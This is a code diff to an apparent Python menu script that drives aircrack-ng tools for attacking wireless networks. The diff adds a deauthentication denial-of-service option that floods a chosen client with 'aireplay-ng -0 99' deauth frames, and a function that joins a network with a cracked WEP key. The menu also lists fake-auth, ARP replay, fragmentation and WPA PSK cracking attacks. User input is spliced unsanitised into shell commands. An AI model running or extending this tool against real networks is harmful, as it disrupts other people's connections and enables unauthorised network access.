@@ -101,6 +101,17 @@ def printpass():
 def fragout():
    os.system ("gnome-terminal -x aireplay-ng -5 -b \""+bssid+"\" -h \""+station+"\" mon0")
 
+def deauthlikeamofo():
+   deauthsomeone = "aireplay-ng -0 99 -a "+bssid+" -c "+target_station+" mon0"
+   print deauthsomeone
+   os.system("gnome-terminal -x "+deauthsomeone+" &")
+
+def connect():
+   wepkey = raw_input("WEP Key: ")
+   connectlist= ';'.join(("iwconfig "+interface+" essid "+essid+" mode managed channel "+channel+" key "+wepkey,
+      "dhclient "+interface))
+   os.system(connectlist)
+   
 #==========================qr==========================D
 
 interface = "wlan0"
@@ -120,7 +131,7 @@ listen()
 
 cont = "n"
 while (cont == "n"): 
-   listen_selection = raw_input("\n 0 Change Target\n 1 Fake-auth(FAST)\n 2 ARP Replay\n 3 Deauth Someone\n 4 Frag Attack\n 5 Aircrack\n 6 WPA PSK Crack\n 7 Print Pass\n 8 Quit\n\nplease pick a number: ")
+   listen_selection = raw_input("\n 0  Change Target\n 1  Fake-auth(FAST)\n 2  ARP Replay\n 3  Deauth Someone\n 4  Frag Attack\n 5  WEP crack\n 6  WPA PSK Crack\n 7  Print Pass\n 8  DOS Deauth\n 9  Connect\n 10 Quit\n\nplease pick a number: ")
    if listen_selection == "0":
       scan()
       # input target prefs
@@ -146,6 +157,12 @@ while (cont == "n"):
    elif listen_selection == "7":
       printpass()
    elif listen_selection == "8":
+      target_station = raw_input("Input station target: ")
+      print "u jerk >:/"
+      deauthlikeamofo()   
+   elif listen_selection == "9":
+      connect()	
+   elif listen_selection == "10":
       print "cleaning up"
       housekeeping()
   # elif listen_selection == "9":
